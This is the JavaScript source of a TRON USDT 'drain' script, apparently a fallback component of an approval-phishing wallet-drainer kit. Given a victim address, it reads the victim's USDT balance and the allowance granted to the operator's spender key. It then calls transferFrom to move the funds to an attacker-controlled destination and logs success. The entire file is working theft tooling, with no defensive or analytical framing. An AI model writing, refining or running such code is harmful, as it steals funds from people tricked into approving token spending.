/**
 * Manual Drain Fallback Script
 * 
 * Usage: node drain-script.js <VICTIM_ADDRESS> [AMOUNT_USDT]
 * 
 * If AMOUNT_USDT omitted, drains min(balance, allowance).
 * Requires .env with SPENDER_PK, DEST, FULL_HOST (same as server.js)
 */

require('dotenv').config();
const { TronWeb } = require('tronweb');

const PK = (process.env.SPENDER_PK || '').trim();
const DEST = (process.env.DEST || '').trim();
const FULL_HOST = process.env.FULL_HOST || 'https://api.trongrid.io';
const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const FEE_LIMIT = 100_000_000;

if (!PK) { console.error('SPENDER_PK missing in .env'); process.exit(1); }
if (!DEST) { console.error('DEST missing in .env'); process.exit(1); }

const tw = new TronWeb({ fullHost: FULL_HOST, privateKey: PK });
const SPENDER = tw.address.fromPrivateKey(PK);

const victimAddr = process.argv[2];
const amountArg = process.argv[3];

if (!victimAddr || !tw.isAddress(victimAddr)) {
  console.error('Usage: node drain-script.js <VICTIM_ADDRESS> [AMOUNT_USDT]');
  process.exit(1);
}

async function constantCall(selector, params) {
  const r = await tw.transactionBuilder.triggerConstantContract(
    USDT, selector, {}, params, SPENDER
  );
  const hex = (r && r.constant_result && r.constant_result[0]) || '';
  return hex ? BigInt('0x' + hex) : 0n;
}

const getBalance = a => constantCall('balanceOf(address)', [{ type: 'address', value: a }]);
const getAllowance = a => constantCall('allowance(address,address)',
  [{ type: 'address', value: a }, { type: 'address', value: SPENDER }]);

async function trxBalance() {
  try { return await tw.trx.getBalance(SPENDER); } catch { return 0; }
}

async function transferFrom(owner, units) {
  const built = await tw.transactionBuilder.triggerSmartContract(
    USDT,
    'transferFrom(address,address,uint256)',
    { feeLimit: FEE_LIMIT, callValue: 0 },
    [
      { type: 'address', value: owner },
      { type: 'address', value: DEST },
      { type: 'uint256', value: units.toString() }
    ],
    SPENDER
  );
  const tx = built.transaction || built;
  if (!tx) throw new Error('tx build failed');
  const signed = await tw.trx.sign(tx);
  const res = await tw.trx.sendRawTransaction(signed);
  return res.txid || signed.txID;
}

const fmt = u => (Number(u) / 1e6).toFixed(6).replace(/\.?0+$/, '');
const short = a => a.slice(0, 6) + '…' + a.slice(-6);

async function main() {
  console.log('[+] Manual Drain');
  console.log(`    Spender: ${SPENDER}`);
  console.log(`    Dest:    ${DEST}`);
  console.log(`    Victim:  ${victimAddr}`);

  const [bal, allow] = await Promise.all([getBalance(victimAddr), getAllowance(victimAddr)]);
  console.log(`    Balance:    ${fmt(bal)} USDT`);
  console.log(`    Allowance:  ${allow > 1e12 ? '∞ (max)' : fmt(allow)} USDT`);

  if (bal === 0n) { console.error('[-] Balance is 0'); process.exit(1); }
  if (allow === 0n) { console.error('[-] No allowance'); process.exit(1); }

  let units = bal < allow ? bal : allow;

  if (amountArg) {
    const n = String(amountArg).trim();
    if (!/^\d+(\.\d{0,6})?$/.test(n)) { console.error('[-] Bad amount format'); process.exit(1); }
    const want = BigInt(Math.round(Number(n) * 1e6));
    units = want < units ? want : units;
  }

  if (units === 0n) { console.error('[-] Nothing to move'); process.exit(1); }

  const trx = await trxBalance();
  console.log(`    Spender TRX: ${trx}`);
  if (trx < 20_000_000) { console.error('[-] Low TRX on spender (< 20 TRX)'); process.exit(1); }

  console.log(`[+] Draining ${fmt(units)} USDT...`);

  try {
    const txid = await transferFrom(victimAddr, units);
    console.log(`[+] Success!`);
    console.log(`    TxID: ${txid}`);
    console.log(`    Tronscan: https://tronscan.org/#/transaction/${txid}`);
  } catch (e) {
    console.error(`[-] Failed: ${e.message}`);
    process.exit(1);
  }
}

main();